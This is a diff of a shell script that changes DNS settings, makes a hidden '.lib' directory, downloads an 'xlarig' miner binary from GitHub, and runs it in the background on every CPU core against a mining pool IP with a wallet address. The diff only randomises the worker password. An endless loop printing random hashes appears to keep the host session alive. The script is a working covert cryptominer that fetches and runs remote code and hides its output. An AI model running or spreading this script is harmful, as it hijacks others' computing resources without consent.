@@ -10,5 +10,5 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 mkdir .lib && cd .lib
 wget https://github.com/bengetsia/soft/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz
-./xlarig --donate-level 1 -o 64.225.98.155:443 -u TBs1Jbnpc4wPm6DEMaYD2fLsrjQiyZRss8pMALW57gZBbpw5CX8unbJA9ToGsJYVFi3wuZoNdKVzY8iuNHnJNemB5fHULqpXyK -p cungur -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
+./xlarig --donate-level 1 -o 64.225.98.155:443 -u TBs1Jbnpc4wPm6DEMaYD2fLsrjQiyZRss8pMALW57gZBbpw5CX8unbJA9ToGsJYVFi3wuZoNdKVzY8iuNHnJNemB5fHULqpXyK -p $(echo $(shuf -i 1-30000 -n 1)-WES) -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
